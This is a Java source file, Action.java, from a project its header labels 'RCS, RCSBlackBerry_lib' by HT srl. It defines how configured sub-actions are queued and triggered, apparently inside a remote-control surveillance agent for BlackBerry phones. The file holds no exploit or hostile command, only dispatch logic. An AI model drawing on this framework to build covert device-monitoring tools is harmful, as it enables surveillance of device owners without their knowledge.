//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry_lib
 * 
 * File         : Action.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry.action;

import net.rim.device.api.util.CloneableVector;
import rpc.json.me.JSONException;
import blackberry.GeneralException;
import blackberry.Managed;
import blackberry.Status;
import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.utils.BlockingQueueTrigger;

/**
 * The Class Action.
 */
public class Action implements Managed {

    /** The debug instance. */
    //#ifdef DEBUG
    protected static Debug debug = new Debug("Action", DebugLevel.VERBOSE);
    //#endif

    /** The Constant ACTION_UNINIT. */
    public static final int ACTION_UNINIT = -2;

    /** The Constant ACTION_NULL. */
    public static final int ACTION_NULL = -1;

    private static final int QUEUE_MAIN = 0;
    private static final int QUEUE_FAST = 1;

    /** The triggered. */
    BlockingQueueTrigger triggerQueue;

    /** The sub action list. */
    private CloneableVector list = null;

    /** The Action id. */
    public int actionId = -1;

    // Event triggeringEvent;

    Status status;

    private String desc;

    private String queueDesc;

    /**
     * Instantiates a new action.
     * 
     * @param actionId_
     *            the action id_
     */
    public Action(final int actionId, String desc) {
        this.actionId = actionId;
        this.desc = desc;
        list = new CloneableVector();
        status = Status.getInstance();
        setQueue(QUEUE_FAST);
    }

    public String getId() {
        return Integer.toString(actionId);
    }

    public int getActionId() {
        return actionId;
    }

    /**
     * Gets the sub actions num.
     * 
     * @return the sub actions num
     */
    public int getSubActionsNum() {
        return list.size();
    }

    /**
     * Adds the sub action.
     * 
     * @param type
     *            the type
     * @param jsubaction
     *            the params
     * @throws GeneralException
     *             the RCS exception
     * @throws JSONException
     * @throws ConfigurationException
     */
    public boolean addSubAction(final ConfAction actionConf) {

        try {
            if (actionConf.getType() != null) {
                final SubAction sub = SubAction.factory(actionConf.getType(),
                        actionConf);
                if (sub == null) {
                    //#ifdef DEBUG
                    debug.error("addSubAction Error (addSubAction): unknown type: "
                            + actionConf.getType());
                    //#endif
                    return false;
                }

                list.addElement(sub);

                if (sub instanceof SubActionMain) {
                    setQueue(QUEUE_MAIN);
                }
                return true;
            } else {
                //#ifdef DEBUG
                debug.error("addSubAction: null type");
                //#endif

                return false;
            }
        } catch (ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("addSubAction");
            //#endif
        }
        return false;
    }

    private void setQueue(int queue) {

        if (queue == QUEUE_FAST) {
            this.triggerQueue = status.getTriggeredQueueFast();
            this.queueDesc = "FAST";
        } else {
            this.triggerQueue = status.getTriggeredQueueMain();
            this.queueDesc = "MAIN";
        }
    }

    /**
     * Gets the sub action.
     * 
     * @param index
     *            the index
     * @return the sub action
     * @throws GeneralException
     *             the rCS exception
     */
    public SubAction getSubAction(final int index) throws GeneralException {
        if (index < 0 || index >= list.size()) {
            throw new GeneralException(
                    "Subaction index above SubAction array boundary"); //$NON-NLS-1$
        }

        return (SubAction) list.elementAt(index);
    }

    public CloneableVector getSubActions() {
        return (CloneableVector) list.clone();
    }

    public String getDesc() {
        return desc;
    }

    public void trigger(Event event) {
        Trigger trigger = new Trigger(actionId, event);
        triggerQueue.enqueue(trigger);
        //#ifdef DEBUG
        debug.trace("triggered: " + this);
        //#endif
    }

    public void unTrigger() {
        triggerQueue.unTrigger(actionId);
    }

    //#ifdef DEBUG
    public final String toString() {
        String ret = getId() + " [" + getDesc().toUpperCase() + "] qq: "
                + queueDesc ;
        for (int i = 0; i < list.size(); i++) {
            SubAction sub = (SubAction) list.elementAt(i);
            ret += "\n    "+ sub;
        }
        return ret;

    }
    //#endif

}
